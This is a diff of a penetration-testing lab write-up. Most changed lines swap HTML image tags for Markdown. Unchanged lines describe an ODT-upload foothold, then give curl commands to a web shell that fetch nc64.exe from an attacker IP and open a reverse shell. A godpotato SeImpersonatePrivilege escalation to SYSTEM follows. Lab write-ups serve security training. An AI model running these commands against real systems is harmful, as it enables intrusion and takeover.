@@ -18,15 +18,15 @@ PORT   STATE SERVICE
 
 The HTTP site was a Lorem Ipsum website:
 
-<figure><img src="../../../.gitbook/assets/image (1837).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1837).png>)
 
 If we scroll down, we can see that there is a file upload for our 'resume'.
 
-<figure><img src="../../../.gitbook/assets/image (3098).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3098).png>)
 
 I tried to upload an image, and this triggered an error:
 
-<figure><img src="../../../.gitbook/assets/image (686).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(686).png>)
 
 An ODT file is similar to a Microsoft Word document, which can be created using `libreoffice`. Seeing that we can only upload ODT files, this machine might have a script opening the files and being able to trigger some macros embedded within the file.
 
@@ -84,7 +84,7 @@ Active sessions
 
 Resume this sesison to drop into our shell:
 
-<figure><img src="../../../.gitbook/assets/image (955).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(955).png>)
 
 ## Privilege Escalation
 
@@ -132,15 +132,13 @@ craft\apache
 
 We can then download `nc64.exe` onto the machine and get a shell as `apache`:
 
-{% code overflow="wrap" %}
 ```
 $ curl -G --data-urlencode 'cmd=powershell -c wget 192.168.45.197/nc64.exe -Outfile C:/Windows/Tasks/nc.exe' http://192.168.197.169/cmd.php
 
 $ curl -G --data-urlencode 'cmd=C:/Windows/Tasks/nc.exe -e cmd.exe 192.168.45.197 21' http://192.168.197.169/cmd.php
 ```
-{% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (3938).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3938).png>)
 
 ### SeImpersonatePrivilege
 
@@ -164,12 +162,10 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 
 We can use `godpotato.exe` to exploit this:
 
-{% code overflow="wrap" %}
 ```
 C:\Windows\Tasks>.\godpotato.exe -cmd "cmd /c C:\Windows\Tasks\nc.exe -e cmd.exe 192.168.45.197 21"
 ```
-{% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (2055).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2055).png>)
 
 Rooted!
